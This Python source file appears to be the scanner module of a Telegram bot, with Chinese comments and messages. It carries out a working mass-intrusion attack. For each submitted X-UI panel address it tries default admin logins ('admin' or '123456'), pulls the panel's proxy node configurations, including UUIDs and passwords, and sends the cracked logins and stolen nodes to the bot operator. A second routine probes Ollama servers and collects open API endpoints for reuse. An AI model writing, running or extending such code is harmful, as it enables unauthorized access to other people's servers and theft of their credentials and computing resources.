# handlers/scanner.py (优化版本)
import os
import time
import yaml
import asyncio
import aiohttp
import threading
import json
from typing import Tuple, Dict, List
from collections import defaultdict, Counter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from config import config, States, Permissions
from data_manager import data_manager
from utils.ui_helpers import UIHelper
from handlers.common import CommonHandler
from utils.proxy_parser import skip_cn

class ScanStatistics:
    """扫描统计信息管理器 - 单一职责原则"""
    
    def __init__(self):
        self.reset()
    
    def reset(self):
        """重置统计信息"""
        self.total_urls = 0
        self.scanned_urls = 0
        self.success_count = 0
        self.failed_count = 0
        self.start_time = time.time()
        self.proxy_types = Counter()
        self.country_distribution = Counter()
        self.new_proxies = []
        self.successful_logins = []
        self.current_batch = 0
        self.batch_size = 10  # 每10个更新一次状态
    
    def add_success(self, url: str, proxies: List[dict] = None):
        """记录成功结果"""
        self.scanned_urls += 1
        self.success_count += 1
        
        if proxies:
            for proxy in proxies:
                proxy_type = proxy.get('type', 'unknown')
                self.proxy_types[proxy_type] += 1
                
                # 从名称中提取国家信息
                name = proxy.get('name', '')
                if '|' in name:
                    country = name.split('|')[0]
                    self.country_distribution[country] += 1
                else:
                    self.country_distribution['Unknown'] += 1
            
            self.new_proxies.extend(proxies)
    
    def add_failure(self, url: str):
        """记录失败结果"""
        self.scanned_urls += 1
        self.failed_count += 1
    
    def should_update_progress(self) -> bool:
        """判断是否应该更新进度 - 避免频繁更新"""
        return self.scanned_urls % self.batch_size == 0 or self.scanned_urls == self.total_urls
    
    def get_progress_text(self, scan_name: str, current_url: str = "") -> str:
        """生成进度文本"""
        elapsed = time.time() - self.start_time
        progress_rate = self.scanned_urls / elapsed if elapsed > 0 else 0
        remaining = max(0, self.total_urls - self.scanned_urls)
        estimated_remaining = remaining / progress_rate if progress_rate > 0 else 0
        
        progress_percent = (self.scanned_urls / self.total_urls * 100) if self.total_urls > 0 else 0
        
        return f"""✨✨ {scan_name}扫描进行中

✨✨ 扫描统计：
• 总目标：{self.total_urls} 个
• 已扫描：{self.scanned_urls}/{self.total_urls} ({progress_percent:.1f}%)
• 成功：{self.success_count} 个 | 失败：{self.failed_count} 个
• 获得节点：{len(self.new_proxies)} 个

⏱️ 时间统计：
• 已用时间：{self._format_time(elapsed)}
• 预计剩余：{self._format_time(estimated_remaining)}

✨✨ 当前扫描：{current_url[:35]}...

✨✨ 点击下方按钮可立即停止扫描"""
    
    def get_final_report(self, scan_name: str) -> str:
        """生成最终报告"""
        elapsed = time.time() - self.start_time
        success_rate = (self.success_count / self.total_urls * 100) if self.total_urls > 0 else 0
        
        # 代理类型统计
        type_stats = []
        for proxy_type, count in self.proxy_types.most_common():
            type_stats.append(f"  • {proxy_type}: {count} 个")
        type_text = "\n".join(type_stats) if type_stats else "  • 无节点获取"
        
        # 国家分布统计
        country_stats = []
        for country, count in self.country_distribution.most_common(10):  # 显示前10个国家
            country_stats.append(f"  • {country}: {count} 个")
        country_text = "\n".join(country_stats) if country_stats else "  • 无国家信息"
        
        return f"""✅ {scan_name}扫描完成！

✨✨ 扫描统计：
• 总目标：{self.total_urls} 个
• 扫描成功：{self.success_count} 个
• 扫描失败：{self.failed_count} 个
• 成功率：{success_rate:.1f}%
• 总耗时：{self._format_time(elapsed)}

✨✨ 节点统计：
• 总获得节点：{len(self.new_proxies)} 个
{type_text}

✨✨ 国家分布：
{country_text}

✨✨ 所有节点已实时保存到文件"""
    
    def _format_time(self, seconds: float) -> str:
        """格式化时间显示"""
        if seconds < 60:
            return f"{seconds:.1f}秒"
        elif seconds < 3600:
            return f"{int(seconds // 60)}分{int(seconds % 60)}秒"
        else:
            return f"{int(seconds // 3600)}小时{int((seconds % 3600) // 60)}分"


class ProxyMatcher:
    """代理匹配器 - 基于IP+端口匹配，遵循单一职责原则"""
    
    @staticmethod
    def create_key(proxy: dict) -> str:
        """创建代理唯一键 - server:port组合"""
        server = proxy.get('server')
        port = proxy.get('port')
        if server and port:
            return f"{server}:{port}"
        return None
    
    @staticmethod
    def merge_proxy_info(old_proxy: dict, new_proxy: dict, source_url: str) -> dict:
        """智能合并代理信息"""
        merged = old_proxy.copy()
        
        # 核心字段直接更新
        core_fields = ['type', 'server', 'port', 'uuid', 'password', 'cipher', 
                      'network', 'tls', 'security', 'path', 'headerType']
        
        for key in core_fields:
            if key in new_proxy:
                merged[key] = new_proxy[key]
        
        # 智能名称更新
        if 'name' in new_proxy and new_proxy['name']:
            new_name = new_proxy['name']
            old_name = merged.get('name', '')
            # 新名称更详细则更新
            if len(new_name) > len(old_name) and '|' in new_name:
                merged['name'] = new_name
        
        # 可选字段条件更新
        optional_fields = ['sni', 'alpn', 'host']
        for key in new_proxy:
            if key in optional_fields and new_proxy[key] and not merged.get(key):
                merged[key] = new_proxy[key]
        
        return merged


class ScannerHandler(CommonHandler):
    """扫描任务处理器 - 统一XUI和Ollama扫描逻辑"""
    
    def __init__(self):
        super().__init__()
        self.check_count = config.DEFAULT_CHECK_COUNT
        self.active_scans = {}
        self.proxy_lock = threading.Lock()
        self.proxy_matcher = ProxyMatcher()
    
    async def scan_xui_prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """XUI扫描提示"""
        query = update.callback_query
        await query.answer()
        
        if not self.check_permission(update.effective_user.id, Permissions.ADMIN):
            await query.edit_message_text("❌ 权限不足")
            return
        
        prompt_text = f"""✨✨ XUI面板扫描

✨✨ 请发送要扫描的URL列表：
• 每行一个URL
• 支持HTTP/HTTPS协议  
• 最多扫描 {self.check_count} 个目标

✨✨ 示例格式：
http://1.2.3.4:54321
https://example.com:8080

发送URL列表或上传文件开始扫描..."""
        
        keyboard = [[InlineKeyboardButton("❌ 取消", callback_data='back_to_start')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        self.user_states[update.effective_chat.id] = States.SCAN_XUI
        await query.edit_message_text(prompt_text, reply_markup=reply_markup)
    
    async def scan_ollama_prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Ollama扫描提示"""
        query = update.callback_query
        await query.answer()
        
        if not self.check_permission(update.effective_user.id, Permissions.ADMIN):
            await query.edit_message_text("❌ 权限不足")
            return
        
        prompt_text = f"""✨✨ Ollama API扫描

✨✨ 请发送要扫描的URL列表：
• 每行一个URL
• 支持HTTP/HTTPS协议
• 最多扫描 {self.check_count} 个目标

✨✨ 示例格式：
http://1.2.3.4:8000
https://api.example.com

发送URL列表开始扫描..."""
        
        keyboard = [[InlineKeyboardButton("❌ 取消", callback_data='back_to_start')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        self.user_states[update.effective_chat.id] = States.SCAN_OLLAMA
        await query.edit_message_text(prompt_text, reply_markup=reply_markup)
    
    async def handle_scan_urls(self, update: Update, context: ContextTypes.DEFAULT_TYPE, 
                              urls: list, scan_type: str) -> None:
        """统一处理扫描URL - 完全异步实现"""
        chat_id = update.effective_chat.id
        
        # 设置取消标志和统计信息
        cancel_flag = {'cancelled': False}
        self.active_scans[chat_id] = cancel_flag
        
        stats = ScanStatistics()
        stats.total_urls = min(len(urls), self.check_count)
        urls = urls[:self.check_count]
        
        scan_name = "XUI面板" if scan_type == "xui" else "Ollama API"
        
        # 创建取消按钮
        cancel_keyboard = InlineKeyboardMarkup([[
            InlineKeyboardButton("✨✨ 取消扫描", callback_data=f'cancel_scan_{chat_id}')
        ]])
        
        status_message = await update.message.reply_text(
            f"✨✨ {scan_name}扫描任务\n\n⏱️ 状态：准备开始...", 
            reply_markup=cancel_keyboard
        )
        
        try:
            # 使用完全异步的扫描方法
            if scan_type == "xui":
                await self._scan_xui_async(urls, cancel_flag, status_message, scan_name, stats)
            else:  # ollama
                await self._scan_ollama_async(urls, cancel_flag, status_message, scan_name, stats)
            
            # 发送最终结果
            if not cancel_flag['cancelled']:
                await self._send_final_results(update, context, status_message, stats, scan_type)
            else:
                keyboard = [[InlineKeyboardButton("✨✨ 返回主菜单", callback_data='back_to_start')]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await status_message.edit_text("❌ 扫描任务已被用户取消", reply_markup=reply_markup)
        
        except Exception as e:
            keyboard = [[InlineKeyboardButton("✨✨ 返回主菜单", callback_data='back_to_start')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await status_message.edit_text(f"❌ 扫描失败: {str(e)}", reply_markup=reply_markup)
        
        finally:
            # 清理状态
            self.user_states[chat_id] = States.IDLE
            self.active_scans.pop(chat_id, None)
    
    async def _scan_xui_async(self, urls: list, cancel_flag: dict, status_message, 
                             scan_name: str, stats: ScanStatistics) -> None:
        """完全异步的XUI扫描"""
        # 创建异步HTTP会话
        connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 创建信号量限制并发
            semaphore = asyncio.Semaphore(5)
            
            # 创建任务列表
            tasks = []
            for i, url in enumerate(urls):
                task = self._scan_single_xui_async(
                    session, semaphore, url, i,
                    stats, cancel_flag, status_message, scan_name
                )
                tasks.append(task)
            
            # 并发执行所有任务
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _scan_single_xui_async(self, session, semaphore, url: str, index: int,
                                   stats: ScanStatistics, cancel_flag: dict, 
                                   status_message, scan_name: str) -> None:
        """扫描单个XUI地址"""
        async with semaphore:
            if cancel_flag['cancelled']:
                return
            
            try:
                # 标准化URL
                if not url.startswith(('http://', 'https://')):
                    url = f"http://{url}"
                if ':' not in url.split('//')[-1]:
                    url += ":54321"
                
                # 尝试登录
                passwords = ["admin", "123456"]
                login_success = False
                
                for password in passwords:
                    if cancel_flag['cancelled']:
                        return
                    
                    success, cookie = await self._try_xui_login_async(session, url, password)
                    if success and not cancel_flag['cancelled']:
                        stats.successful_logins.append(f"{url} admin,{password}")
                        
                        # 获取节点配置
                        proxies = await self._get_xui_proxies_async(session, url, cookie, cancel_flag)
                        if proxies and not cancel_flag['cancelled']:
                            # 实时追加并统计
                            added_count = await self._append_proxies_realtime(proxies, url)
                            stats.add_success(url, proxies)
                        else:
                            stats.add_success(url)
                        
                        login_success = True
                        break
                
                if not login_success:
                    stats.add_failure(url)
                
                # 批量更新进度
                if stats.should_update_progress() and not cancel_flag['cancelled']:
                    await self._update_progress_message(
                        status_message, stats, scan_name, url, cancel_flag
                    )
                        
            except Exception as e:
                if not cancel_flag['cancelled']:
                    stats.add_failure(url)
                    print(f"扫描{url}失败: {e}")
    
    async def _append_proxies_realtime(self, new_proxies: list, source_url: str) -> int:
        """实时追加代理到文件 - 基于IP+端口匹配"""
        try:
            added_count = 0
            
            def _update_proxies():
                nonlocal added_count
                
                # 加载现有代理
                existing_proxies = data_manager.load_proxies()
                
                # 构建基于IP:端口的映射字典
                existing_dict = {}
                for proxy in existing_proxies:
                    key = self.proxy_matcher.create_key(proxy)
                    if key:
                        existing_dict[key] = proxy
                
                updates = []
                additions = []
                
                for new_proxy in new_proxies:
                    proxy_key = self.proxy_matcher.create_key(new_proxy)
                    if not proxy_key:
                        continue
                    
                    if proxy_key in existing_dict:
                        # 相同IP:端口的代理已存在，执行更新操作
                        old_proxy = existing_dict[proxy_key]
                        updated_proxy = self.proxy_matcher.merge_proxy_info(
                            old_proxy, new_proxy, source_url
                        )
                        existing_dict[proxy_key] = updated_proxy
                        updates.append(proxy_key)
                    else:
                        # 新的IP:端口组合，添加新代理
                        existing_dict[proxy_key] = new_proxy
                        additions.append(proxy_key)
                        added_count += 1
                
                # 保存更新后的代理列表
                final_proxies = list(existing_dict.values())
                data_manager.save_proxies(final_proxies)
                
                return updates, additions
            
            # 在线程池中执行文件操作
            loop = asyncio.get_event_loop()
            updates, additions = await loop.run_in_executor(None, _update_proxies)
            
            # 记录操作日志
            if updates:
                print(f"✨✨ 更新代理: {len(updates)} 个 - {source_url}")
            if additions:
                print(f"➕ 新增代理: {len(additions)} 个 - {source_url}")
            
            return added_count
            
        except Exception as e:
            print(f"❌ 实时追加代理失败: {e}")
            return 0
    
    async def _try_xui_login_async(self, session, url: str, password: str) -> Tuple[bool, str]:
        """异步登录XUI"""
        login_data = {
            "username": "admin", 
            "password": password
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        }
        
        try:
            async with session.post(f'{url}/login', data=login_data, headers=headers) as response:
                if response.status == 200:
                    result = await response.json()
                    if result.get("success"):
                        cookie = response.headers.get('Set-Cookie')
                        return True, cookie or ""
                return False, ""
        except:
            return False, ""
    
    async def _get_xui_proxies_async(self, session, url: str, cookie: str, cancel_flag: dict) -> list:
        """异步获取XUI代理配置"""
        if cancel_flag['cancelled'] or not cookie:
            return []
        
        headers = {
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15',
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        }
        
        try:
            async with session.post(f'{url}/xui/inbound/list', headers=headers) as response:
                if cancel_flag['cancelled']:
                    return []
                
                if response.status == 200:
                    result = await response.json()
                    if result.get("success"):
                        return self._parse_xui_response(result, url)
                return []
        except:
            return []
    
    def _parse_xui_response(self, response: dict, base_url: str) -> list:
        """解析XUI响应生成代理配置"""
        proxies = []
        server_ip = base_url.split('://')[1].split(':')[0]
        
        country_code = skip_cn(server_ip)
        
        for item in response.get("obj", []):
            if not (item.get("enable") and item.get("expiryTime") == 0):
                continue
            
            protocol = item.get("protocol")
            name = f"{country_code}|{server_ip}:{item['port']}"
            
            if protocol == "vmess":
                settings = json.loads(item.get("settings", "{}"))
                stream_settings = json.loads(item.get("streamSettings", "{}"))
                
                proxy_config = {
                    'name': name,
                    'type': 'vmess',
                    'server': server_ip,
                    'port': item["port"],
                    'uuid': settings.get("clients", [{}])[0].get("id"),
                    'alterId': 0,
                    'cipher': 'none',
                    'network': stream_settings.get("network", 'tcp'),
                    'tls': False,
                    'udp': False
                }
                
                if proxy_config['network'] == "ws":
                    proxy_config.update({
                        'path': stream_settings.get("wsSettings", {}).get("path", "/"),
                        'headerType': 'none'
                    })
                
                proxies.append(proxy_config)
                
            elif protocol == "vless":
                settings = json.loads(item.get("settings", "{}"))
                stream_settings = json.loads(item.get("streamSettings", "{}"))
                
                proxy_config = {
                    'name': name,
                    'type': 'vless',
                    'server': server_ip,
                    'port': item["port"],
                    'uuid': settings.get("clients", [{}])[0].get("id"),
                    'network': stream_settings.get("network", 'tcp'),
                    'security': 'none'
                }
                proxies.append(proxy_config)
                
            elif protocol == "shadowsocks":
                settings = json.loads(item.get("settings", "{}"))
                
                proxy_config = {
                    'name': name,
                    'type': 'ss',
                    'server': server_ip,
                    'port': item["port"],
                    'cipher': settings.get("method", "aes-256-gcm"),
                    'password': settings.get("password", ""),
                    'udp': True
                }
                proxies.append(proxy_config)
                
            elif protocol == "trojan":
                settings = json.loads(item.get("settings", "{}"))
                
                proxy_config = {
                    'name': name,
                    'type': 'trojan',
                    'server': server_ip,
                    'port': item["port"],
                    'password': settings.get("clients", [{}])[0].get("password", ""),
                    'sni': '',
                    'udp': True
                }
                proxies.append(proxy_config)
        
        return proxies
    
    async def _scan_ollama_async(self, urls: list, cancel_flag: dict, status_message,
                               scan_name: str, stats: ScanStatistics) -> None:
        """完全异步的Ollama扫描"""
        connector = aiohttp.TCPConnector(limit=20, limit_per_host=10)
        timeout = aiohttp.ClientTimeout(total=3)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(15)
            
            tasks = []
            for i, url in enumerate(urls):
                task = self._scan_single_ollama_async(
                    session, semaphore, url, i,
                    stats, cancel_flag, status_message, scan_name
                )
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _scan_single_ollama_async(self, session, semaphore, url: str, index: int,
                                      stats: ScanStatistics, cancel_flag: dict,
                                      status_message, scan_name: str) -> None:
        """扫描单个Ollama API"""
        async with semaphore:
            if cancel_flag['cancelled']:
                return
            
            try:
                # 标准化URL
                if not url.startswith(('http://', 'https://')):
                    url = f"http://{url}"
                
                # 检查API
                headers = {'Authorization': 'Bearer aaa'}
                async with session.get(f'{url}/v1/models', headers=headers) as response:
                    if not cancel_flag['cancelled'] and response.status == 200:
                        stats.add_success(url)
                        await self._append_ollama_url(url)
                    else:
                        stats.add_failure(url)
                
                # 批量更新进度
                if stats.should_update_progress() and not cancel_flag['cancelled']:
                    await self._update_progress_message(
                        status_message, stats, scan_name, url, cancel_flag
                    )
                        
            except Exception as e:
                if not cancel_flag['cancelled']:
                    stats.add_failure(url)
                    print(f"扫描Ollama {url}失败: {e}")
    
    async def _append_ollama_url(self, url: str) -> None:
        """实时追加Ollama URL到文件"""
        try:
            def _save_url():
                existing_urls = set()
                ollama_file = "ollama_apis.txt"
                
                if os.path.exists(ollama_file):
                    with open(ollama_file, 'r', encoding='utf-8') as f:
                        existing_urls = {line.strip() for line in f if line.strip()}
                
                if url not in existing_urls:
                    with open(ollama_file, 'a', encoding='utf-8') as f:
                        f.write(f"{url}\n")
            
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(None, _save_url)
            
        except Exception as e:
            print(f"❌ 保存Ollama URL失败: {e}")
    
    async def _update_progress_message(self, status_message, stats: ScanStatistics,
                                     scan_name: str, current_url: str, cancel_flag: dict) -> None:
        """批量更新进度显示 - 避免频繁更新"""
        if cancel_flag['cancelled']:
            return
        
        try:
            progress_text = stats.get_progress_text(scan_name, current_url)
            
            cancel_keyboard = InlineKeyboardMarkup([[
                InlineKeyboardButton("✨✨ 取消扫描", callback_data=f'cancel_scan_{status_message.chat.id}')
            ]])
            
            await status_message.edit_text(progress_text, reply_markup=cancel_keyboard)
        except Exception as e:
            # 忽略Telegram API限制错误
            if "too many requests" not in str(e).lower():
                print(f"更新进度失败: {e}")
    
    async def cancel_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """立即取消扫描任务"""
        chat_id = update.effective_chat.id
        
        if chat_id in self.active_scans:
            self.active_scans[chat_id]['cancelled'] = True
            await update.message.reply_text("✅ 正在停止扫描任务...")
        else:
            await update.message.reply_text("❌ 当前没有正在进行的扫描任务")
    
    async def cancel_scan_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """处理取消扫描按钮回调"""
        query = update.callback_query
        await query.answer("正在停止扫描...")
        
        chat_id = int(query.data.split('_')[-1])
        
        if chat_id in self.active_scans:
            self.active_scans[chat_id]['cancelled'] = True
    
    async def _send_final_results(self, update, context, status_message, 
                                 stats: ScanStatistics, scan_type: str) -> None:
        """发送最终扫描结果"""
        scan_name = "XUI面板" if scan_type == "xui" else "Ollama API"
        
        # 生成详细报告
        final_report = stats.get_final_report(scan_name)
        
        keyboard = [[InlineKeyboardButton("✨✨ 返回主菜单", callback_data='back_to_start')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await status_message.edit_text(final_report, reply_markup=reply_markup)
        
        # 发送结果文件
        if stats.success_count > 0:
            await self._send_result_files(update, context, stats, scan_type)
    
    async def _send_result_files(self, update, context, stats: ScanStatistics, scan_type: str) -> None:
        """发送结果文件"""
        try:
            timestamp = int(time.time())
            
            if scan_type == "xui":
                # 发送节点配置文件
                if stats.new_proxies:
                    nodes_filename = f"scan_nodes_{timestamp}.txt"
                    with open(nodes_filename, "w", encoding='utf-8') as f:
                        yaml.dump(stats.new_proxies, f, default_flow_style=False, 
                                allow_unicode=True, sort_keys=False)
                    
                    with open(nodes_filename, "rb") as f:
                        await context.bot.send_document(
                            chat_id=update.effective_chat.id,
                            document=f,
                            filename=nodes_filename,
                            caption=f"📄 扫描节点配置 ({len(stats.new_proxies)} 个节点)"
                        )
                    
                    os.remove(nodes_filename)
                
                # 发送登录信息文件
                if stats.successful_logins:
                    logins_filename = f"scan_logins_{timestamp}.txt"
                    with open(logins_filename, "w", encoding='utf-8') as f:
                        f.write("\n".join(stats.successful_logins))
                    
                    with open(logins_filename, "rb") as f:
                        await context.bot.send_document(
                            chat_id=update.effective_chat.id,
                            document=f,
                            filename=logins_filename,
                            caption=f"🔑 成功登录信息 ({len(stats.successful_logins)} 个)"
                        )
                    
                    os.remove(logins_filename)
            
            else:  # ollama
                # 发送完整的ollama文件
                if os.path.exists("ollama_apis.txt"):
                    with open("ollama_apis.txt", "rb") as f:
                        await context.bot.send_document(
                            chat_id=update.effective_chat.id,
                            document=f,
                            filename="ollama_apis.txt",
                            caption="🍺 所有可用的Ollama API"
                        )
                
        except Exception as e:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"❌ 发送文件失败: {str(e)}"
            )
    
    async def handle_document_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """处理文档上传"""
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        state = self.user_states.get(chat_id, States.IDLE)
        
        if not self.check_permission(user_id, Permissions.ADMIN):
            await update.message.reply_text("❌ 权限不足")
            return
        
        if state not in [States.SCAN_XUI, States.SCAN_OLLAMA]:
            await update.message.reply_text("❌ 当前不在扫描状态")
            return
        
        try:
            document = update.message.document
            file = await context.bot.get_file(document.file_id)
            file_path = os.path.join(config.UPLOAD_DIR, document.file_name)
            
            await file.download_to_drive(file_path)
            await update.message.reply_text("📄 文件已接收，正在处理...")
            
            # 读取文件内容
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            urls = [line.strip() for line in lines if line.strip()]
            
            # 执行扫描
            scan_type = "xui" if state == States.SCAN_XUI else "ollama"
            await self.handle_scan_urls(update, context, urls, scan_type)
            
            # 清理文件
            try:
                os.remove(file_path)
            except:
                pass
        
        except Exception as e:
            await update.message.reply_text(f"❌ 处理文件失败: {str(e)}")
    
    def set_check_count(self, count: int) -> None:
        """设置检查数量"""
        self.check_count = count